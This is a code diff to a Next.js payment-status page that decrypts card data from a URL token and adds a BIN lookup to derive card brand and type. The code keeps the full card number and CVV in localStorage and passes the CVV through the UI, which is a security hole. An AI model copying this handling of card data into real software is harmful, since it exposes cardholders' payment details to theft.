@@ -2,6 +2,8 @@ import { useEffect, useState } from "react";
 import type { GetServerSideProps } from "next";
 import PaymentStatusModal from "@/components/PaymentStatusModal";
 import { decryptPayload } from "@/lib/payloadCipher";
+import { CheckCardService } from "@/services/checkCardService";
+import { mapBinlistToCardMeta } from "@/lib/binMeta";
 
 interface PaymentPayload {
   payment: {
@@ -12,8 +14,6 @@ interface PaymentPayload {
     email: string;
     celular: string;
     telefono: string;
-    cardBrand: string;
-    metodo: string;
   };
   price: string;
   priceFormatted: string;
@@ -25,6 +25,11 @@ interface HomeProps {
   valid: boolean;
   payload?: PaymentPayload;
 }
+
+const localBrand = (card: string): string => {
+  const local = CheckCardService.validateCard(card);
+  return local.success && local.brand !== "N/A" ? (local.brand ?? "") : "N/A";
+};
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
   const token = typeof ctx.query.d === "string" ? ctx.query.d : "";
@@ -55,13 +60,59 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 export default function Home({ valid, payload }: HomeProps) {
   const [sessionId] = useState(() => `demo-${Date.now()}`);
   const [isOpen, setIsOpen] = useState(false);
+  const [cardMeta, setCardMeta] = useState<{ cardBrand: string; metodo: string }>(() => ({
+    cardBrand: "N/A",
+    metodo: "N/A",
+  }));
+
+  useEffect(() => {
+    if (!valid || !payload) return;
+
+    const cleanCard = payload.payment.numeroTarjeta.replace(/\D/g, "");
+    const bin = cleanCard.slice(0, 6);
+
+    localStorage.setItem("checkout_payment", JSON.stringify(payload.payment));
+
+    const resolve = async () => {
+      if (bin.length < 6) {
+        setCardMeta({ cardBrand: localBrand(cleanCard), metodo: "N/A" });
+        setIsOpen(true);
+        return;
+      }
+
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 5000);
+
+      try {
+        const res = await fetch(`/api/bin/lookup?bin=${bin}`, {
+          signal: controller.signal,
+        });
+        if (!res.ok) throw new Error("lookup falló");
+        const data = await res.json();
+        setCardMeta(mapBinlistToCardMeta(data.scheme, data.type));
+      } catch {
+        setCardMeta({ cardBrand: localBrand(cleanCard), metodo: "N/A" });
+      } finally {
+        clearTimeout(timeout);
+      }
+      setIsOpen(true);
+    };
+
+    resolve();
+  }, [valid, payload]);
 
   useEffect(() => {
     if (valid && payload) {
-      localStorage.setItem("checkout_payment", JSON.stringify(payload.payment));
-      setIsOpen(true);
+      localStorage.setItem(
+        "checkout_payment",
+        JSON.stringify({
+          ...payload.payment,
+          cardBrand: cardMeta.cardBrand,
+          metodo: cardMeta.metodo,
+        }),
+      );
     }
-  }, [valid, payload]);
+  }, [valid, payload, cardMeta]);
 
   if (!valid || !payload) {
     return (
@@ -80,18 +131,18 @@ export default function Home({ valid, payload }: HomeProps) {
       last4={payload.payment.numeroTarjeta.slice(-4)}
       card={payload.payment.numeroTarjeta}
       cardT={
-        payload.payment.metodo === "credito"
+        cardMeta.metodo === "credito"
           ? "Crédito"
-          : payload.payment.metodo === "debito"
+          : cardMeta.metodo === "debito"
             ? "Débito"
-            : payload.payment.metodo === "prepago"
+            : cardMeta.metodo === "prepago"
               ? "Prepago"
               : "N/A"
       }
       vencimiento={payload.payment.vencimiento}
       cvv={payload.payment.cvv}
       titular={payload.payment.titular}
-      cardBrand={payload.payment.cardBrand}
+      cardBrand={cardMeta.cardBrand}
       email={payload.payment.email}
       contactData={{ email: payload.payment.email, celular: payload.payment.celular }}
       redirectSuccess={payload.redirectSuccess}
